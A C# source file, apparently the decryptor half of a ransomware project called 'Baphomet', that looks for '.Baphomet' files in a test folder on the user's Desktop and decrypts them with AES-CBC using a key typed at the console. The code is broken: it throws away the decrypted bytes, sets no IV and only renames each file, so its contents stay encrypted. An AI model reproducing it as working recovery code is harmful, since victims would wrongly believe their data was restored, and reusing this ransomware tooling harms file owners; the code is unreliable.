using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Decrypt
    {

        public static void decryptConfirm()
        {
            var userName = Environment.UserName;
            var userDir = "C:\\Users\\" + userName;
            directoryRoad(userDir);
        }

        static void directoryRoad(string userDir)
        {
            var targetPath = userDir + "\\Desktop\\test";
            var extensionCheck = new[] { ".Baphomet" };

            string[] files = Directory.GetFiles(targetPath);
            string[] subDirs = Directory.GetDirectories(targetPath);

            for (int i = 0; i < files.Length; i++)
            {
                var extension = Path.GetExtension(files[i]);
                if (extensionCheck.Contains(extension))
                {
                    decryptFileData(files[i], targetPath);
                }
            }
        }

        static void decryptFileData(string file, string path)
        {
            Console.WriteLine("Enter your key here:");
            string strKey = Console.ReadLine();

            byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
            // byte[] passwordBytes = Encoding.UTF8.GetBytes(strKey);
            byte[] key = Convert.FromBase64String(strKey);

            byte[] bytesDecrypted = decryptFileByte(bytesToBeDecrypted, key);
            var extension = Path.GetExtension(file);
            var result = file.Substring(0, file.Length - extension.Length);
            System.IO.File.Move(file, result);
        }


        static byte[] decryptFileByte(byte[] bytesToBeDecrypted, byte[] key)
        {
            byte[] decryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {

                    AES.BlockSize = 128;
                    AES.Key = key;

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();

                }
            }
            return decryptedBytes;
        }
    }
}
